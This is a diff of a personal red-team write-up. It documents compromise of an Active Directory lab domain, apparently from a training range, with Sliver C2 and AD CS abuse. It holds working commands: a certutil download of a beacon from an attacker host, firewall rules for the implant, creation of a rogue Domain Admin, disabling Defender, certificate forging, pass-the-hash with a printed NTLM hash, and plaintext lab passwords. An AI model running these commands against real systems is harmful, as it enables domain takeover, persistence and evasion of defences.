@@ -20,7 +20,7 @@ Learnt:
 - Sliver is awesome
 - C2 Workflow
 - AD CS abuse 101
-
+- [Windows Loves Passwords](https://learn.microsoft.com/en-us/powershell/module/activedirectory/set-adaccountpassword?view=windowsserver2022-ps)
 
 
 ![](october.png)
@@ -56,6 +56,9 @@ Firstly connecting to have a pretend domain squated email.
 
 
 ## OSINT  
+
+Message from Am03baM4n
+![](messagefromAmoebaman1.png)
 
 Alh4zr3d initial steps while enumerating in the background begin with `crackmapexec`.
 ```
@@ -361,7 +364,8 @@ Shakestech recommends [https://github.com/iphelix/dnschef](https://github.com/ip
 
 ## Initial Compromise of Active Directory
 
-
+Message from Am03baM4n
+![](messagefromAmoebaman2.png)
 ```bash
 proxychains4 python3 /opt/BloodHound.py/bloodhound.py --dns-tcp -c all -d corp.thereserve.loc -ns 10.200.117102 -u 'lisa.moore' -p 'Scientist2006'
 ```
@@ -738,6 +742,8 @@ Next thing I wanted to do is create the ultimate User from this ticket so that I
 
 We need login to the DC and dc-sync another DC as that looks normal! 
 
+## Full Compromise of Parent Domain
+
 Certipy - 101 with [Alh4zr3d](https://www.twitch.tv/videos/1829218217) - I used [Kali version - certifpy-ad](https://www.kali.org/tools/certipy-ad/)
 ```bash
 # This worked a week ago
@@ -797,67 +803,153 @@ proxychains impacket-wmiexec -k -no-pass -dc-ip 10.200.117.102 Administrator@COR
 ```
 ![](wmiexecontothedc.png)
 
-On the DC , I understand this is not Opsec safe, but I want flags and I have time constraints
-```powershell
-certutil.exe -urlcache -split -f http://10.50.114.111:8443/Word.exe Word.exe
-```
-
 #### Another Reset later..
 
 I wondered why I could download from the DC and then I guessed someone before me had reconfigure the firewall, so I added a few [rules](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/netsh-advfirewall-firewall-control-firewall-behavior). Not Opsec Safe but I need my DA account
 ```powershell
 netsh advfirewall firewall add rule name= "Open Port 8443" dir=in action=allow protocol=TCP localport=8443
 netsh advfirewall firewall add rule name= "Open Port 8443" dir=out action=allow protocol=TCP localport=8443
-
-
 netsh advfirewall firewall add rule name="nvm-the-beacon" dir=in action=allow program="C:\Users\Administrator\Desktop\Word.exe" enable=yes
 ```
 
-Possible the must hacky bad sysadmin red team reoccuring rake-to-facer  
+On the DC , I understand this is not Opsec safe, but I want flags and I have time constraints
+```powershell
+# Beacon Drop
+# Either via
+certutil.exe -urlcache -split -f http://10.50.114.111:8443/DC1/Word.exe Word.exe
+# or Share
+impacket-smbserver share $(pwd) -smb2support
+xcopy \\10.50.114.111\Share\Word.exe .
+```
+
+
+Possibly the most hacky bad sysadmin or red team reoccurring rake-to-facer  
 ```powershell
 # Creating the ultimate Domain Admin user so I will use a Sliver shell
 import-module ActiveDirectory
-
-$pass = convertto-securestring -asplaintext -force -string "da15ADMIN#Nvm"
-New-ADUser -Name 'NVMthisAccount' -AccountPassword $pass
-
-Add-ADGroupMember -Identity "Domain Admins" -Members "NVMthisAccount"
-Add-ADGroupMember -Identity "Back Office Support" -Members "NVMthisAccount"
-Add-ADGroupMember -Identity "Development" -Members "NVMthisAccount" 
-Add-ADGroupMember -Identity "Group Policy Creator Owners" -Members "NVMthisAccount"
-Add-ADGroupMember -Identity "HR Share RW" -Members "NVMthisAccount"
-Add-ADGroupMember -Identity "Internet Access" -Members "NVMthisAccount"
-Add-ADGroupMember -Identity "Key Admins" -Members "NVMthisAccount"
-Add-ADGroupMember -Identity "Private Clients" -Members "NVMthisAccount"
-Add-ADGroupMember -Identity "Protected Users" -Members "NVMthisAccount"
-Add-ADGroupMember -Identity "Server Admins" -Members "NVMthisAccount"
-Add-ADGroupMember -Identity "Services" -Members "NVMthisAccount"
-Add-ADGroupMember -Identity "Tier 0 Admins" -Members "NVMthisAccount"
-Add-ADGroupMember -Identity "Tier 1 Admins" -Members "NVMthisAccount"
-Add-ADGroupMember -Identity "Tier 2 Admins" -Members "NVMthisAccount"
-Add-ADGroupMember -Identity "Remote Desktop Users" -Members "NVMthisAccount"
-net localgroup "Administrators" NVMthisAccount /add 
-
-net user NVMthisAccount /dom
+# Check for groups you what
 Get-ADGroup -filter *
+# $pass = convertto-securestring -asplaintext -force -string "da15ADMIN#Nvm"
+
+New-ADUser -Name 'NVM2'
+# Forgot to set a password ..
+Set-ADAccountPassword -Identity NVM2 -NewPassword (ConvertTo-SecureString -AsPlainText "p@ssw0rd1!" -Force)
+# Note to self Nesting and each group can cancel out, each other just because you can does not mean you should, Subscriber for AZ or DA is enough, chill!
+Add-ADGroupMember -Identity "Domain Admins" -Members "NVM2"
+Enable-ADAccount -Identity NVM2
+net localgroup "Administrators" NVM2 /add 
+net user NVM2 /dom
+# Update the Group Policy
+gpupdate /force
 ```
 
-Unpausing [Alh4zr3d](https://www.twitch.tv/videos/1829218217) to document manual AD CS abuse
-Manual CS Abuse
 
-Recon a Certificate with an RDP session
+The horror...
+![](powerlevelisover9000.png)
+
+In the face of this I want to also make:
+- Silver Tickets
+- Golden Tickets
+- Golden Certs if time.
+
+In interim research and resets, rebuilds and redeployment I documented... 
+
+#### Manual CS Abuse
+
+Unpausing [Alh4zr3d](https://www.twitch.tv/videos/1829218217) to document manual AD CS abuse
+Make a new Certificate with an RDP session - From [Alh4zr3d stream](https://www.twitch.tv/videos/1829218217) 
 - `Search 'MMC' -> File -> Add/Remove Snap-in -> Certificate -> Add -> $account -> 'Snap-in always manage:' Local computer -> Ok`
 - Find from `MMC` main: `Console Root -> Certificate (Local Computer) -> Trusted Root Certification Authority\ Certificates -> $yourCertInThisList -> [Left Click] to view, Edit Properties..., Copy to File...`
-- Request a new Certificate `Console Root -> Certificate (Local Computer)\Personal -> [Right Click] Request New Certificate... -> Next -> Next (Configured by you or Configured by your  administrator) -> Click to Configure settings`
-	- Subject Name:
-		- Type
-		- Value
-	- Alternative Name
-		- Type
-		- Value
-- `Enroll` 
+- Request a new Certificate `Console Root -> Certificate (Local Computer)\Personal -> [Right Click] Request New Certificate... -> Next -> Next (Configured by you or Configured by your administrator) -> Click to Configure settings`
+	-  Subject Tab
+		- Subject Name:
+			- Type
+			- Value
+		- Alternative Name
+			- Type
+			- Value
+	-  Private Key Tab
+		- `Key Options -> [Tick] Make Private Key Exportable`  
+- `Enroll`  after selecting Certificate on the Request Certificates 
+- Export Certificate with `[Right Click] on Certificate -> All Tasks -> Export`
+	- Export with Private Key - You need to Private Key
+		- Make sure you have selected the option to make Private Key exportable in the `Private Key Tab`!
+	- Disable Certificate Privacy
+	- Create a Password
+	- Export
+
+Get it back to your box somehow
+```bash
+certipy-ad cert -export -pfx ./admincCert.pfx -password "yourpassword" -out "unprotected.pfx"
+proxychains4 certipy-ad auth -dc-ip 10.200.117.102 -ns 10.200.117.102 -pfx unprotected.pfx
+```
+
+Disable Restricted-Administrator settings to allow for RDP. Not Opsec safe if not obvious
+```powershell
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
+
+Export the certificate manual GUI non-usb-Mr-Robot-style  and either use C\# [GhostPack/ForgeCert](https://github.com/GhostPack/ForgeCert) or Python [pyForgeCert](https://github.com/Ridter/pyForgeCert) to forge certificate
+```bash
+python3 pyForgeCert.py -i $infile -pfx -p 'PasswordGoesHere' -s 'SubjectNameGoesHere' -a 'AltNameGoesHere' -o $outputPath 
+```
+
+Then export the certificate and authenticate
+```bash
+certipy-ad cert -export -pfx $forgedAdmin.pfx -password "yourpassword" -out "unprotected.pfx"
+certipy-ad auth -dc-ip 10.200.117.102 -ns 10.200.117.102 -pfx unprotected.pfx
+```
 
 
+[Tyler](https://www.youtube.com/watch?v=xzxpn6k7OIQ) demonstrates we could also use `evil-winrm` and the hash from the dc-sync to remote into the dc through pass-the-hash 
+```bash
+proxychains evil-winrm -i 10.200.117.102 -u Administrator -H 'd3d4edcc015856e386074795aea86b3e'
+```
+
+#### Catching up on Email
+
+Messages from Am03baM4n
+![](messagefromAmoebaman3.png)
+
+Server Alert..
+![](messagefromAmoebaman4.png)
+
+Server Takeover
+![](messagefromAmoebaman5.png)
+
+DC has fallen
+![](messagefromAmoebaman6.png)
+
+#### Golden Tickets with Tyler
+
+[Tyler](https://www.youtube.com/watch?v=Td_Krk1S3yg) did:
+```powershell
+proxychains4 xfreerdp /u:NVM2 /p:'p@ssw0rd1!' /v:10.200.117.102
+Set-MpPreference -DisableRealTimeMonitoring $true
+
+```
+
+I have a sliver beacon on the DC with some serious capabilities
+```go
+// Smoother install
+armory install -t 30 -c all  
+// Inventory check
+armory
+
+
+
+c2tc-kerberoast roast *
+// There is a svcEDR account which would be cool to try to be
+
+// AD CS
+sa-adcs-enum // Save in data sa-adcs-enum.out
+// tried but failed
+remote-adcs-request [flags] CA [template] [subject] [alt-name] [Install] [Machine]
+```
+
+```
+
+```
 
 
 https://tishina.in/opsec/sliver-opsec-notes#implant%20obfuscation%20and%20export%20formats
@@ -865,10 +957,9 @@ https://www.cybereason.com/blog/sliver-c2-leveraged-by-many-threat-actors
 https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html
 
 
-
-
-
-
-## Full Compromise of Parent Domain
 ## Full Compromise of BANK Domain
+
+
 ## Compromise of SWIFT and Payment Transfer
+
+Requires two users - One for the memes has to be Emily.
